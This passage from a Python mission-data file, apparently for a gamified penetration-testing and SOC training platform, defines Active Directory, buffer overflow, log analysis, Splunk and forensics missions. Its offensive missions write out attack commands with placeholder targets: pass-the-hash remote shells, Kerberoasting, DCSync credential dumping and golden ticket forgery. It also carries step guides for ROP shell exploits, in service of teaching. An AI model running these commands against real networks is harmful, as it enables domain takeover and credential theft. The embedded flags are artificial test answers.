"""
CyberSim Stage 3-4 Mission Data — Days 366-730
Advanced missions: Active Directory, Buffer Overflow, Blue Team, Malware Dev,
Process Injection, EDR Evasion, C2 Operations, Career Prep.
"""
from core.mission_types import TYPE_LAB, TYPE_THEORY, TYPE_PROJECT, TYPE_CAREER, TYPE_EXTERNAL

# ═══════════════════════════════════════════════════════════════════════════════
#  STAGE 3 MISSIONS — PROFESSIONAL (OSCP-Level)
# ═══════════════════════════════════════════════════════════════════════════════

STAGE3_MISSIONS = {

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 1001: Active Directory Reconnaissance
# ──────────────────────────────────────────────────────────────────────────────
1001: {
    "id": 1001,
    "name": "Active Directory Recon",
    "type": TYPE_LAB,
    "phase": 3,
    "docker_image": "ad_lab",
    "container": "cybersim_ad_target",
    "description": "Learn to enumerate an Active Directory domain — users, groups, trusts, and GPOs.",
    "procedure": "1. Use ldapsearch to enumerate domain objects\n2. Run enum4linux for SMB enumeration\n3. Identify domain controllers and trust relationships\n4. Map user accounts and group memberships",
    "suggestion": "Start with anonymous LDAP queries before trying authenticated enumeration.",
    "advanced_advice": "In real environments, use BloodHound to visualize attack paths from your initial foothold to Domain Admin.",
    "easy": {
        "briefing": (
            "Welcome to your first Active Directory engagement. A corporate domain has been\n"
            "set up for penetration testing. Your mission is to enumerate the domain and\n"
            "discover all user accounts, groups, and computers.\n\n"
            "Active Directory is the backbone of 90% of enterprise networks. If you can\n"
            "compromise AD, you own the entire company. This mission teaches you the\n"
            "reconnaissance phase — mapping the domain before attacking it."
        ),
        "objective": "Enumerate the AD domain. Find all users, groups, and the Domain Admin account. Retrieve the flag from the shared drive.",
        "methods": [
            "LDAP Enumeration — Query the directory service for objects",
            "SMB Enumeration — enum4linux finds shares, users, and policies",
            "DNS Enumeration — Discover domain controllers via SRV records",
        ],
        "tools": [
            ("ldapsearch", "ldapsearch -x -H ldap://<DC_IP> -b 'DC=corp,DC=local'", "LDAP directory query"),
            ("enum4linux", "enum4linux -a <DC_IP>", "All-in-one SMB/LDAP enumeration"),
            ("nmap", "nmap -sV -p 88,135,139,389,445,636 <DC_IP>", "AD-specific port scan"),
        ],
        "step_by_step_guide": (
            "1. Scan the target for AD-specific ports (88=Kerberos, 389=LDAP, 445=SMB)\n"
            "2. Use ldapsearch to query the base DN and enumerate users\n"
            "3. Run enum4linux -a to discover shares and user accounts\n"
            "4. Check for readable shares using smbclient\n"
            "5. Find the flag file on the accessible share"
        ),
        "security_level": "No IDS — Free enumeration allowed",
        "flag": "FLAG{ad_recon_complete_2024}",
        "xp_reward": 150,
    },
    "normal": {
        "briefing": (
            "The SOC team has deployed basic monitoring. You need to enumerate the AD\n"
            "domain without triggering excessive LDAP queries. Use targeted enumeration\n"
            "and avoid broad scans that generate noise."
        ),
        "objective": "Enumerate AD with minimal detection. Find the service accounts and extract the flag from a protected share.",
        "methods": [
            "Targeted LDAP queries — Only query specific OUs",
            "Kerberos User Enumeration — kerbrute to find valid users",
            "SMB Share Mapping — smbmap for stealthy share discovery",
        ],
        "tools": [
            ("kerbrute", "kerbrute userenum -d corp.local users.txt --dc <DC_IP>", "Kerberos user enumeration"),
            ("smbmap", "smbmap -H <DC_IP> -u '' -p ''", "SMB share access mapping"),
            ("rpcclient", "rpcclient -U '' -N <DC_IP>", "RPC-based enumeration"),
        ],
        "step_by_step_guide": (
            "1. Use kerbrute to enumerate valid domain users without authentication\n"
            "2. Map accessible SMB shares with smbmap\n"
            "3. Use rpcclient for targeted user/group enumeration\n"
            "4. Access the protected share with discovered credentials\n"
            "5. Extract the flag"
        ),
        "security_level": "SOC Monitoring — Excessive queries trigger alerts",
        "flag": "FLAG{ad_stealth_enum_2024}",
        "xp_reward": 200,
    },
    "hard": {
        "briefing": (
            "Enterprise-grade EDR is active. The Blue Team is watching. Your enumeration\n"
            "must be surgical — one wrong move and your IP gets blocked."
        ),
        "objective": "Enumerate AD using only Kerberos-based techniques. Find the hidden service account and extract the flag.",
        "methods": [
            "Kerberos-only Enumeration — Avoid LDAP/SMB entirely",
            "AS-REP Roasting — Find accounts without pre-auth",
            "SPN Discovery — Find service accounts to Kerberoast",
        ],
        "tools": [
            ("impacket", "GetNPUsers.py corp.local/ -dc-ip <DC_IP> -no-pass -usersfile users.txt", "AS-REP roasting"),
            ("GetUserSPNs.py", "GetUserSPNs.py corp.local/user:pass -dc-ip <DC_IP>", "Kerberoasting"),
            ("bloodhound-python", "bloodhound-python -d corp.local -u user -p pass -ns <DC_IP>", "Remote BloodHound collection"),
        ],
        "step_by_step_guide": (
            "1. Use AS-REP Roasting to find accounts without pre-authentication\n"
            "2. Crack the AS-REP hash offline with hashcat\n"
            "3. Use the cracked account for Kerberoasting\n"
            "4. Crack the service ticket to get service account access\n"
            "5. Use the service account to access the flag"
        ),
        "security_level": "EDR Active + Blue Team Monitoring — Stealth required",
        "flag": "FLAG{ad_kerberos_master_2024}",
        "xp_reward": 300,
        "defender_config": {"scan_threshold": 5, "scan_window": 10},
    },
},

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 1002: AD Lateral Movement
# ──────────────────────────────────────────────────────────────────────────────
1002: {
    "id": 1002,
    "name": "AD Lateral Movement",
    "type": TYPE_LAB,
    "phase": 3,
    "docker_image": "ad_lab",
    "container": "cybersim_ad_target",
    "description": "Move laterally through an Active Directory network using Pass-the-Hash and token impersonation.",
    "procedure": "1. Compromise initial workstation\n2. Dump credentials from memory\n3. Use Pass-the-Hash to access other machines\n4. Pivot to Domain Controller",
    "suggestion": "Always check for cached credentials and Kerberos tickets on compromised hosts.",
    "advanced_advice": "In real engagements, use Overpass-the-Hash to generate Kerberos tickets from NTLM hashes for stealthier lateral movement.",
    "easy": {
        "briefing": (
            "You have compromised a workstation on the corporate network. Your mission\n"
            "is to move laterally to other machines and eventually reach the Domain Controller.\n\n"
            "Lateral movement is how attackers expand their access after the initial breach.\n"
            "Once you compromise one machine, you use its credentials to access others."
        ),
        "objective": "Use Pass-the-Hash from the compromised workstation to access the file server and retrieve the flag.",
        "methods": [
            "Pass-the-Hash (PtH) — Use NTLM hash without cracking the password",
            "PsExec — Remote command execution via SMB",
            "WMI Exec — Remote code execution via WMI",
        ],
        "tools": [
            ("pth-winexe", "pth-winexe -U 'CORP/admin%hash' //<TARGET> cmd.exe", "Pass-the-Hash remote shell"),
            ("psexec.py", "psexec.py -hashes :NTLM_HASH admin@<TARGET>", "Impacket PsExec"),
            ("crackmapexec", "crackmapexec smb <TARGET> -u admin -H <HASH>", "Mass lateral movement"),
        ],
        "step_by_step_guide": (
            "1. Extract the NTLM hash from the compromised workstation\n"
            "2. Use crackmapexec to test the hash against other machines\n"
            "3. Use psexec.py with the hash to get a shell on the file server\n"
            "4. Navigate to the shared folder and retrieve the flag"
        ),
        "security_level": "No monitoring — Free movement",
        "flag": "FLAG{lateral_move_pth_2024}",
        "xp_reward": 175,
    },
    "normal": {
        "briefing": (
            "The network has basic IDS. PsExec creates too much noise. You need to use\n"
            "stealthier lateral movement techniques like WMI and DCOM."
        ),
        "objective": "Move laterally using WMI execution. Avoid PsExec-based techniques. Retrieve the flag from the Domain Controller.",
        "methods": [
            "WMI Exec — Fileless remote execution",
            "DCOM Lateral Movement — COM object abuse",
            "Token Impersonation — Steal another user's session",
        ],
        "tools": [
            ("wmiexec.py", "wmiexec.py -hashes :NTLM_HASH admin@<DC_IP>", "WMI-based remote shell"),
            ("dcomexec.py", "dcomexec.py -hashes :NTLM_HASH admin@<DC_IP>", "DCOM execution"),
            ("evil-winrm", "evil-winrm -i <DC_IP> -u admin -H <HASH>", "WinRM shell with hash"),
        ],
        "step_by_step_guide": (
            "1. Use wmiexec.py for fileless command execution on the DC\n"
            "2. Enumerate the DC for sensitive files\n"
            "3. Use evil-winrm for a persistent shell if WMI is blocked\n"
            "4. Extract the flag from the Administrator's desktop"
        ),
        "security_level": "IDS Active — PsExec signatures detected",
        "flag": "FLAG{lateral_wmi_stealth_2024}",
        "xp_reward": 225,
    },
    "hard": {
        "briefing": (
            "Full EDR deployment. All known lateral movement techniques are flagged.\n"
            "You must use advanced evasion: Overpass-the-Hash, DCSync, or Golden Ticket."
        ),
        "objective": "Perform DCSync to dump all domain hashes. Use the Domain Admin hash to create a Golden Ticket and access the flag.",
        "methods": [
            "DCSync Attack — Replicate domain credentials via DRSUAPI",
            "Golden Ticket — Forge Kerberos TGT for any user",
            "Overpass-the-Hash — Convert NTLM to Kerberos ticket",
        ],
        "tools": [
            ("secretsdump.py", "secretsdump.py corp.local/admin@<DC_IP> -hashes :HASH", "DCSync attack"),
            ("ticketer.py", "ticketer.py -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-... -domain corp.local administrator", "Golden Ticket"),
            ("getTGT.py", "getTGT.py corp.local/admin -hashes :HASH", "Get TGT from NTLM hash"),
        ],
        "step_by_step_guide": (
            "1. Use secretsdump.py to perform a DCSync and dump the krbtgt hash\n"
            "2. Forge a Golden Ticket using ticketer.py\n"
            "3. Import the ticket and access the DC as Domain Admin\n"
            "4. Extract the flag from the SYSVOL share"
        ),
        "security_level": "Full EDR — Advanced evasion required",
        "flag": "FLAG{golden_ticket_dcsync_2024}",
        "xp_reward": 350,
        "defender_config": {"scan_threshold": 3, "scan_window": 10},
    },
},

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 1003: Buffer Overflow Basics (Theory)
# ──────────────────────────────────────────────────────────────────────────────
1003: {
    "id": 1003,
    "name": "Buffer Overflow Fundamentals",
    "type": TYPE_THEORY,
    "phase": 3,
    "description": "Understand memory layout, stack frames, and how buffer overflows corrupt program execution.",
    "procedure": "1. Study stack memory layout (text, data, heap, stack)\n2. Understand function prologue/epilogue\n3. Learn how overwriting EIP/RIP controls execution flow\n4. Study NOP sleds and shellcode placement",
    "suggestion": "Draw the stack frame on paper for every exercise. Visual understanding is key.",
    "advanced_advice": "Modern exploits rarely use vanilla stack BOF. Study ROP chains and ASLR/DEP bypass for real-world applicability.",
    "easy": {
        "briefing": (
            "Welcome to exploit development. This theory mission teaches you how computer\n"
            "memory works and why buffer overflows are one of the most dangerous vulnerabilities.\n\n"
            "A buffer overflow occurs when a program writes more data to a buffer than it can hold,\n"
            "corrupting adjacent memory. By carefully crafting the overflow, an attacker can\n"
            "redirect program execution to their own malicious code (shellcode).\n\n"
            "Understanding this is fundamental to both writing exploits and defending against them."
        ),
        "objective": "Study the theory of stack-based buffer overflows. Answer the mentor's knowledge question to prove understanding.",
        "methods": [
            "Stack Memory Layout — text, data, heap, stack segments",
            "Function Prologue — push ebp; mov ebp, esp",
            "Return Address Overwrite — Controlling EIP/RIP",
            "NOP Sled Technique — Landing zone for shellcode",
        ],
        "tools": [
            ("gdb", "gdb ./vulnerable_binary", "GNU Debugger for binary analysis"),
            ("python3", "python3 -c 'print(\"A\"*100)'", "Generate overflow payloads"),
            ("objdump", "objdump -d binary | grep main", "Disassemble binary"),
        ],
        "step_by_step_guide": (
            "1. Read: What is a buffer overflow? (Stack vs Heap)\n"
            "2. Study: How does the stack grow? (High to low addresses)\n"
            "3. Understand: What happens when you overwrite the return address?\n"
            "4. Learn: What is a NOP sled and why is it needed?\n"
            "5. Answer the mentor's question to complete this mission"
        ),
        "security_level": "Theory Mission — No active target",
        "flag": "FLAG{bof_theory_understood_2024}",
        "xp_reward": 100,
    },
    "normal": {
        "briefing": (
            "You understand the basics. Now go deeper — study how DEP (Data Execution Prevention)\n"
            "and ASLR (Address Space Layout Randomization) prevent classic buffer overflows,\n"
            "and how ROP (Return-Oriented Programming) chains bypass these protections.\n\n"
            "Real-world exploits in 2024+ require bypassing multiple mitigations."
        ),
        "objective": "Explain DEP, ASLR, and stack canaries. Describe how ROP chains bypass DEP. Answer the mentor's advanced question.",
        "methods": [
            "DEP/NX — No-Execute memory pages prevent shellcode execution on the stack",
            "ASLR — Randomizes memory layout to prevent hardcoded addresses",
            "Stack Canaries — Random values that detect buffer overflows before return",
            "ROP Chains — Chain existing code gadgets to achieve arbitrary execution",
        ],
        "tools": [
            ("checksec", "checksec --file=binary", "Check binary protections"),
            ("ROPgadget", "ROPgadget --binary binary", "Find ROP gadgets"),
            ("pwntools", "python3 -c 'from pwn import *'", "Exploit development framework"),
        ],
        "step_by_step_guide": (
            "1. Study: How does DEP prevent classic shellcode execution?\n"
            "2. Learn: What is ASLR and how does it randomize addresses?\n"
            "3. Understand: Stack canaries — how are they checked?\n"
            "4. Research: How do ROP chains bypass DEP by reusing existing code?\n"
            "5. Answer the mentor's question about bypass techniques"
        ),
        "security_level": "Theory Mission — Advanced Concepts",
        "flag": "FLAG{bof_mitigations_understood_2024}",
        "xp_reward": 150,
    },
    "hard": {
        "briefing": (
            "Expert-level buffer overflow theory: study heap exploitation (Use-After-Free,\n"
            "Double Free, Heap Spraying), format string vulnerabilities, and kernel-level\n"
            "exploitation primitives. This is OSEP/OSED territory."
        ),
        "objective": "Explain heap exploitation techniques, format string attacks, and at least one CVE that used buffer overflow. Present to the mentor.",
        "methods": [
            "Heap Exploitation — UAF, Double Free, tcache poisoning",
            "Format String — %n writes, arbitrary read/write primitives",
            "Kernel BOF — Ring 0 exploitation for privilege escalation",
            "Real CVEs — Analyze published buffer overflow CVEs",
        ],
        "tools": [
            ("pwndbg", "gdb -q ./binary", "Enhanced GDB for heap analysis"),
            ("heaptrack", "heaptrack ./binary", "Heap allocation tracker"),
            ("one_gadget", "one_gadget /lib/x86_64-linux-gnu/libc.so.6", "Find magic gadgets in libc"),
        ],
        "step_by_step_guide": (
            "1. Study a real CVE that used buffer overflow (e.g., CVE-2021-3156 sudo)\n"
            "2. Learn: How does Use-After-Free work on the heap?\n"
            "3. Research: Format string %n — how does it achieve arbitrary writes?\n"
            "4. Advanced: Read about kernel exploitation primitives\n"
            "5. Present your research to the mentor to pass"
        ),
        "security_level": "Theory Mission — Expert Level",
        "flag": "FLAG{bof_expert_theory_2024}",
        "xp_reward": 250,
    },
},

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 1004: Buffer Overflow Lab
# ──────────────────────────────────────────────────────────────────────────────
1004: {
    "id": 1004,
    "name": "Stack Buffer Overflow Exploitation",
    "type": TYPE_LAB,
    "phase": 3,
    "docker_image": "bof_lab",
    "container": "cybersim_bof_target",
    "description": "Exploit a vulnerable C binary by overflowing a stack buffer to hijack execution and spawn a shell.",
    "procedure": "1. Identify the vulnerable function (strcpy, gets, sprintf)\n2. Find the offset to EIP using pattern_create\n3. Locate shellcode space and bad characters\n4. Craft the exploit payload\n5. Redirect execution to your shellcode",
    "suggestion": "Always check for bad characters (\\x00, \\x0a, \\x0d) before crafting your final payload.",
    "advanced_advice": "In OSCP, you must write BOF exploits from scratch within 45 minutes. Practice until it's muscle memory.",
    "easy": {
        "briefing": (
            "A vulnerable server binary is running on the target. The binary uses the unsafe\n"
            "gets() function, which does not check input length. Your mission is to overflow\n"
            "the buffer, overwrite the return address, and redirect execution to the win() function\n"
            "that prints the flag.\n\n"
            "This is your first hands-on buffer overflow. The binary has NO protections enabled\n"
            "(no ASLR, no DEP, no Stack Canary)."
        ),
        "objective": "Overflow the buffer in the vulnerable binary. Overwrite EIP to call the win() function. Read the flag.",
        "methods": [
            "Fuzzing — Send increasing input to find crash point",
            "Offset Finding — Use pattern_create to find exact EIP offset",
            "Return Address Overwrite — Point EIP to win() function",
        ],
        "tools": [
            ("python3", "python3 -c 'print(\"A\"*200)' | nc <TARGET> 9999", "Send overflow payload"),
            ("gdb", "gdb -q ./vuln", "Debug the binary to find offsets"),
            ("msf-pattern_create", "msf-pattern_create -l 200", "Generate unique pattern"),
        ],
        "step_by_step_guide": (
            "1. Connect to the target on port 9999 and test with normal input\n"
            "2. Send increasing A's until the program crashes (fuzzing)\n"
            "3. Use msf-pattern_create to generate a unique pattern\n"
            "4. Find the exact offset to EIP in the crash\n"
            "5. Find the address of win() using objdump\n"
            "6. Craft payload: padding + win() address\n"
            "7. Send the exploit and read the flag"
        ),
        "security_level": "No Protections — ASLR/DEP/Canary all disabled",
        "flag": "FLAG{stack_bof_first_exploit_2024}",
        "xp_reward": 200,
    },
    "normal": {
        "briefing": (
            "The binary now has a stack canary disabled but DEP is ON. You cannot execute\n"
            "shellcode on the stack. You must use Return-Oriented Programming (ROP) to\n"
            "chain existing code gadgets."
        ),
        "objective": "Bypass DEP using ROP. Chain gadgets to call system('/bin/sh') and read the flag in /root/flag.txt.",
        "methods": [
            "ROP Chain — Chain existing code snippets (gadgets)",
            "ret2libc — Return to libc functions (system, execve)",
            "Gadget Finding — Use ROPgadget or ropper",
        ],
        "tools": [
            ("ROPgadget", "ROPgadget --binary vuln --ropchain", "Find ROP gadgets"),
            ("ropper", "ropper --file vuln --search 'pop rdi'", "Search specific gadgets"),
            ("pwntools", "from pwn import *; elf = ELF('./vuln')", "Python exploit framework"),
        ],
        "step_by_step_guide": (
            "1. Find the EIP offset (same binary, same offset)\n"
            "2. Use ROPgadget to find useful gadgets\n"
            "3. Locate system() and /bin/sh in libc\n"
            "4. Build a ROP chain: pop rdi; ret -> /bin/sh -> system()\n"
            "5. Send the ROP chain and get a shell\n"
            "6. Read /root/flag.txt"
        ),
        "security_level": "DEP Enabled — No stack execution",
        "flag": "FLAG{rop_chain_dep_bypass_2024}",
        "xp_reward": 275,
    },
    "hard": {
        "briefing": (
            "Full protections: ASLR + DEP + Partial RELRO. You must leak a libc address\n"
            "to defeat ASLR, then build a ret2libc ROP chain."
        ),
        "objective": "Leak a libc address, calculate base, build ROP chain, pop a shell, read the flag.",
        "methods": [
            "Information Leak — Leak GOT entries to find libc base",
            "ret2libc with ASLR bypass — Calculate offsets dynamically",
            "Two-stage exploit — Leak first, exploit second",
        ],
        "tools": [
            ("pwntools", "from pwn import *; p = remote('<TARGET>', 9999)", "Exploit framework"),
            ("libc-database", "libc-database search puts <leaked_address>", "Identify libc version"),
            ("one_gadget", "one_gadget /lib/x86_64-linux-gnu/libc.so.6", "Find one-shot shell gadgets"),
        ],
        "step_by_step_guide": (
            "1. Leak the GOT address of puts() using ROP\n"
            "2. Calculate libc base from the leaked address\n"
            "3. Find system() and /bin/sh offsets in libc\n"
            "4. Build a second-stage ROP chain with correct addresses\n"
            "5. Pop a shell and read /root/flag.txt"
        ),
        "security_level": "Full Protection — ASLR + DEP + RELRO",
        "flag": "FLAG{aslr_bypass_master_2024}",
        "xp_reward": 400,
        "defender_config": {"scan_threshold": 3, "scan_window": 10},
    },
},

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 1005: SOC Analyst — Log Analysis (Theory)
# ──────────────────────────────────────────────────────────────────────────────
1005: {
    "id": 1005,
    "name": "SOC Analyst: Log Analysis",
    "type": TYPE_THEORY,
    "phase": 3,
    "description": "Learn to read and analyze security logs like a SOC analyst. Identify incidents from log data.",
    "procedure": "1. Study common log sources (syslog, auth.log, Windows Event Logs)\n2. Learn log analysis tools (grep, awk, journalctl)\n3. Identify attack patterns in logs (brute force, privilege escalation, lateral movement)\n4. Practice writing detection queries",
    "suggestion": "Focus on understanding WHAT to look for, not just HOW to use tools. Attack patterns are universal.",
    "advanced_advice": "Write Sigma rules for every attack pattern you learn. Sigma is the universal detection language used by SOC teams worldwide.",
    "easy": {
        "briefing": (
            "Welcome to the Blue Team side. As a SOC Analyst, your job is to detect the\n"
            "attacks that Red Teamers execute. In this theory mission, you'll learn how\n"
            "to read security logs and identify suspicious activity.\n\n"
            "Every attack leaves traces in logs. A brute-force login attempt, a privilege\n"
            "escalation, a lateral movement — all generate log entries that a trained\n"
            "analyst can spot."
        ),
        "objective": "Study log analysis fundamentals. Identify the attack pattern in the provided sample logs. Answer the mentor's question.",
        "methods": [
            "Syslog Analysis — /var/log/syslog, /var/log/auth.log",
            "Windows Event Log IDs — 4624 (Login), 4625 (Failed), 4672 (Admin)",
            "Pattern Recognition — Identifying brute force, escalation, exfiltration",
        ],
        "tools": [
            ("grep", "grep 'Failed password' /var/log/auth.log | wc -l", "Count failed logins"),
            ("awk", "awk '/sshd.*Failed/{print $11}' /var/log/auth.log | sort | uniq -c", "Attacker IP analysis"),
            ("journalctl", "journalctl -u sshd --since '1 hour ago'", "Recent SSH activity"),
        ],
        "step_by_step_guide": (
            "1. Study: What are the most important log sources on Linux?\n"
            "2. Learn: Key Windows Event Log IDs (4624, 4625, 4672, 4688, 4698)\n"
            "3. Practice: Use grep/awk to filter and analyze auth.log\n"
            "4. Identify: What does a brute-force attack look like in logs?\n"
            "5. Answer the mentor's question to pass"
        ),
        "security_level": "Theory Mission — Blue Team Training",
        "flag": "FLAG{soc_log_analysis_2024}",
        "xp_reward": 100,
    },
    "normal": {
        "briefing": (
            "Go beyond basic log reading. Analyze a multi-stage attack across\n"
            "multiple log sources — correlating SSH brute force with privilege escalation\n"
            "and data exfiltration. Build a complete attack timeline."
        ),
        "objective": "Correlate events from auth.log, syslog, and apache2 access.log to reconstruct a full attack timeline.",
        "methods": [
            "Log Correlation — Matching events across sources by timestamp",
            "Attack Timeline — Building a chronological event chain",
            "IOC Extraction — Pulling attacker IPs, user agents, file hashes",
        ],
        "tools": [
            ("grep+awk", "grep 'Failed password' auth.log | awk '{print $1,$2,$3,$11}' | sort", "Timeline extraction"),
            ("jq", "cat json_logs.log | jq '.[] | select(.severity==\"high\")'", "JSON log filtering"),
            ("timeline", "paste -d, timestamps.txt events.txt > timeline.csv", "Build CSV timeline"),
        ],
        "step_by_step_guide": (
            "1. Analyze auth.log: Find the brute-force window (>10 failures from same IP)\n"
            "2. Correlate: Find the successful login from that IP\n"
            "3. Check syslog: What commands did they run after login?\n"
            "4. Check apache logs: Did they access any web admin panels?\n"
            "5. Build a timeline and answer the mentor's investigation question"
        ),
        "security_level": "Theory Mission — SOC Analyst L2",
        "flag": "FLAG{soc_timeline_built_2024}",
        "xp_reward": 175,
    },
    "hard": {
        "briefing": (
            "Expert SOC analysis: write Sigma detection rules, create automated\n"
            "alerting queries, and analyze APT-style attack patterns with long dwell times\n"
            "and living-off-the-land techniques."
        ),
        "objective": "Write 3 Sigma rules for detecting brute force, PrivEsc, and data exfil. Explain LOLBin detection.",
        "methods": [
            "Sigma Rules — Universal detection format for SIEM tools",
            "LOLBin Detection — Identifying misuse of legitimate binaries",
            "Dwell Time Analysis — Finding long-term persistent attackers",
        ],
        "tools": [
            ("sigma", "sigmac -t splunk rule.yml", "Convert Sigma to Splunk query"),
            ("chainsaw", "chainsaw hunt evtx_logs/ -s sigma_rules/", "Fast Windows log analysis"),
            ("velociraptor", "velociraptor", "Enterprise detection and response"),
        ],
        "step_by_step_guide": (
            "1. Write a Sigma rule for SSH brute force\n"
            "2. Write a Sigma rule for privilege escalation\n"
            "3. Write a Sigma rule for data exfiltration\n"
            "4. Research: How do you detect LOLBin abuse?\n"
            "5. Present your rules to the mentor"
        ),
        "security_level": "Theory Mission — SOC Lead Level",
        "flag": "FLAG{soc_sigma_expert_2024}",
        "xp_reward": 250,
    },
},

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 1006: Splunk Fundamentals (Theory)
# ──────────────────────────────────────────────────────────────────────────────
1006: {
    "id": 1006,
    "name": "Splunk for Security",
    "type": TYPE_THEORY,
    "phase": 3,
    "description": "Learn Splunk SPL queries for security monitoring, alerting, and threat detection.",
    "procedure": "1. Learn Splunk SPL basics (search, stats, timechart)\n2. Build security dashboards\n3. Write correlation rules for attack detection\n4. Create alerts for brute force and privilege escalation",
    "suggestion": "Splunk is used by 80% of Fortune 500 companies. Mastering SPL is a guaranteed career advantage.",
    "advanced_advice": "Learn to write Splunk SOAR playbooks for automated incident response. SOC automation is the future.",
    "easy": {
        "briefing": (
            "Splunk is the industry-standard security information and event management (SIEM)\n"
            "tool. In this mission, you'll learn the Splunk Processing Language (SPL) to\n"
            "search, filter, and visualize security data.\n\n"
            "SOC Analyst roles at companies like Microsoft, Google, and CrowdStrike require\n"
            "Splunk skills. This is one of the most valuable skills for landing a 10+ LPA job."
        ),
        "objective": "Learn SPL basics. Write a query that detects brute-force login attempts. Answer the mentor's question.",
        "methods": [
            "SPL Search — index=security sourcetype=WinEventLog:Security EventCode=4625",
            "Stats Command — | stats count by src_ip | sort -count",
            "Timechart — | timechart span=1h count by EventCode",
        ],
        "tools": [
            ("splunk", "index=main sourcetype=syslog | stats count by host", "Basic Splunk search"),
            ("splunk", "index=security EventCode=4625 | stats count by src_ip | where count>5", "Brute force detection"),
            ("splunk", "index=security EventCode=4672 | table _time user src_ip", "Admin login tracking"),
        ],
        "step_by_step_guide": (
            "1. Study: What is Splunk and how does it ingest data?\n"
            "2. Learn: SPL basics — search, where, stats, table, timechart\n"
            "3. Practice: Write a query to find failed login attempts\n"
            "4. Build: A query that detects >5 failed logins from same IP\n"
            "5. Answer the mentor's question to pass"
        ),
        "security_level": "Theory Mission — Blue Team Training",
        "flag": "FLAG{splunk_spl_basics_2024}",
        "xp_reward": 100,
    },
    "normal": {
        "briefing": (
            "Build full SPL dashboards that correlate authentication events with\n"
            "network traffic anomalies. Create alert rules that catch real attacker behavior."
        ),
        "objective": "Write 3 advanced SPL queries: lateral movement detection, anomalous login times, and data exfiltration alerts.",
        "methods": [
            "Subsearch — Enrich events with context from other indexes",
            "Lookups — Cross-reference IP reputation and asset databases",
            "Transaction — Group related events into attack sequences",
        ],
        "tools": [
            ("splunk", "index=security EventCode=4624 | transaction src_ip maxspan=1h", "Lateral movement"),
            ("splunk", "index=security | where date_hour<6 OR date_hour>22 | stats count by user", "Off-hours login"),
            ("splunk", "index=network | stats sum(bytes_out) as total by src_ip | where total>1073741824", "1GB+ exfil"),
        ],
        "step_by_step_guide": (
            "1. Write a query correlating login with new process events\n"
            "2. Build a dashboard showing failed vs successful logins over time\n"
            "3. Create an alert for >1GB outbound data from a single host\n"
            "4. Use transaction to group lateral movement hops\n"
            "5. Answer the mentor's Splunk scenario question"
        ),
        "security_level": "Theory Mission — SOC Analyst L2",
        "flag": "FLAG{splunk_dashboards_2024}",
        "xp_reward": 175,
    },
    "hard": {
        "briefing": (
            "Enterprise Splunk: Write SOAR playbooks for automated incident response,\n"
            "build correlation rules for multi-stage attacks, and create ML-based anomaly detection."
        ),
        "objective": "Design a Splunk SOAR playbook for automated brute-force response. Write ML-based anomaly detection.",
        "methods": [
            "SOAR Playbooks — Automated incident response workflows",
            "ML Toolkit — Anomaly detection with Splunk MLTK",
            "KV Store — Persistent threat intelligence lookups",
        ],
        "tools": [
            ("splunk", "| fit DensityFunction bytes_out by src_ip | where isOutlier=1", "ML anomaly"),
            ("soar", "phantom playbook", "SOAR automation design"),
            ("splunk", "| inputlookup threat_intel.csv | join src_ip [search index=firewall]", "Threat intel"),
        ],
        "step_by_step_guide": (
            "1. Design a SOAR playbook: brute-force → block IP → create ticket → notify SOC\n"
            "2. Write an ML query for anomalous network traffic\n"
            "3. Create correlation rule: auth failures → login → unusual process\n"
            "4. Build a threat intel lookup table\n"
            "5. Present your SOAR design to the mentor"
        ),
        "security_level": "Theory Mission — SOC Architect Level",
        "flag": "FLAG{splunk_soar_architect_2024}",
        "xp_reward": 250,
    },
},

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 1007: Digital Forensics & Incident Response
# ──────────────────────────────────────────────────────────────────────────────
1007: {
    "id": 1007,
    "name": "Digital Forensics (DFIR)",
    "type": TYPE_THEORY,
    "phase": 3,
    "description": "Learn digital forensics: evidence acquisition, memory forensics, and incident response procedures.",
    "procedure": "1. Study chain of custody and evidence handling\n2. Learn memory forensics with Volatility\n3. Practice disk image analysis\n4. Write an incident response report",
    "suggestion": "Always create forensic images before analyzing evidence. The golden rule: never modify the original evidence.",
    "advanced_advice": "Learn to use YARA rules for malware hunting. Combined with Volatility, you can identify unknown malware in memory dumps.",
    "easy": {
        "briefing": (
            "Digital Forensics is the science of investigating cyber incidents. When a company\n"
            "gets breached, the DFIR team figures out what happened, how, and what data was\n"
            "compromised.\n\n"
            "This is the detective work of cybersecurity. You'll learn to analyze memory dumps,\n"
            "disk images, and network captures to reconstruct an attack timeline."
        ),
        "objective": "Study DFIR fundamentals. Learn evidence handling, memory forensics basics, and incident response frameworks.",
        "methods": [
            "Memory Forensics — Analyze RAM dumps with Volatility",
            "Disk Forensics — Examine file systems with Autopsy/Sleuth Kit",
            "Network Forensics — Analyze PCAP files with Wireshark",
            "Incident Response — NIST/SANS IR frameworks",
        ],
        "tools": [
            ("volatility", "vol.py -f memory.dmp --profile=Win10 pslist", "List running processes from memory"),
            ("strings", "strings memory.dmp | grep -i password", "Extract readable strings from dump"),
            ("autopsy", "autopsy", "GUI-based disk forensics tool"),
        ],
        "step_by_step_guide": (
            "1. Study: What is the DFIR process? (Preparation → Detection → Containment → Eradication → Recovery → Lessons)\n"
            "2. Learn: Evidence handling and chain of custody\n"
            "3. Understand: How Volatility analyzes memory dumps\n"
            "4. Practice: Extract process lists and network connections from a memory dump\n"
            "5. Answer the mentor's question to pass"
        ),
        "security_level": "Theory Mission — Blue Team Training",
        "flag": "FLAG{dfir_fundamentals_2024}",
        "xp_reward": 100,
    },
    "normal": {
        "briefing": (
            "Move from theory to practice. Analyze a simulated memory dump using Volatility\n"
            "to extract running processes, network connections, and injected code.\n"
            "Then write a basic incident response report with your findings."
        ),
        "objective": "Use Volatility commands to analyze a memory dump. Identify the malicious process, its C2 connection, and the injected payload.",
        "methods": [
            "Process Analysis — pslist, psscan, pstree to find hidden processes",
            "Network Analysis — netscan, connscan to find C2 connections",
            "Code Injection — malfind to detect injected code in processes",
            "IR Report Writing — Executive summary, timeline, IOCs, recommendations",
        ],
        "tools": [
            ("volatility", "vol.py -f dump.raw --profile=Win10x64 pstree", "Process tree view"),
            ("volatility", "vol.py -f dump.raw --profile=Win10x64 netscan", "Network connections"),
